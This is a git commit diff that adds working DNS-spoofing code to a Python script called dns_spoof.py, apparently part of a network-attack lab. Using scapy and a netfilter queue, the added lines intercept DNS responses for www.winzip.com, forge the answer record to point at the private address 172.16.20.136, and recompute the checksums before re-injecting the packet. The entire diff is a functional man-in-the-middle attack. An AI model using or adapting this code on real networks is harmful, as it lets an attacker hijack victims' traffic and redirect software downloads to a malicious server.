4c316251bdd9313e8aa0468b0425c5318c7592ac
John Recny <jrecny@gmail.com>
2024-02-02 16:12:53 -0500

    add DNSQR and RR

--- dns_spoof.py
+++ dns_spoof.py
@@ -5,7 +5,22 @@ import scapy.all as scapy
 
 def process_packet(packet):
     scapy_packet = scapy.IP(packet.get_payload())
-    print(scapy_packet.show())
+    if scapy_packet.haslayer(scapy.DNSRR):
+        qname = scapy_packet[scapy.DNSQR].qname
+        if 'www.winzip.com' in qname.decode():
+            print('[+] Spoofing target')
+            answer = scapy.DNSRR(rrname=qname, rdata='172.16.20.136')
+            scapy_packet[scapy.DNS].an = answer
+            scapy_packet[scapy.DNS].ancount = 1
+
+            del scapy_packet[scapy.IP].len
+            del scapy_packet[scapy.IP].chksum
+            del scapy_packet[scapy.UDP].chksum
+            del scapy_packet[scapy.UDP].len
+
+            packet.set_payload(bytes(scapy_packet))
+
+
     packet.accept()
 
 queue = netfilterqueue.NetfilterQueue()
